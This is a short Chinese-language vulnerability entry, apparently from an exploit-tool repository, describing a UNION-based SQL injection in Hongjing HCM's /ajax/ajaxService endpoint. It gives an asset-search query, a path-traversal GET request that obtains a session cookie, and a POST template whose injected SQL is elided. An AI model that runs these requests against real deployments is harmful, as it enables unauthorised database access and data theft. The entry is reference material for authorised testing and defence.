---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 宏景HCM ajaxService SQL注入漏洞

## 漏洞描述

宏景HCM `/ajax/ajaxService` 接口存在 SQL 注入漏洞（UNION 联合注入）。利用前需先请求登录页获取有效 Cookie，再 POST `__xml` 参数注入。

## 影响版本

```
宏景HCM eHR
```

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

```
GET /templates/attestation/%2e%2e/%2e%2e/templates/index/getpassword.jsp HTTP/1.1
# 获取 Cookie

POST /ajax/ajaxService HTTP/1.1
Cookie: <上一步获取>
Content-Type: application/x-www-form-urlencoded

__xml=<... select ... UNION ...>
```

注入成功回显查询结果。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
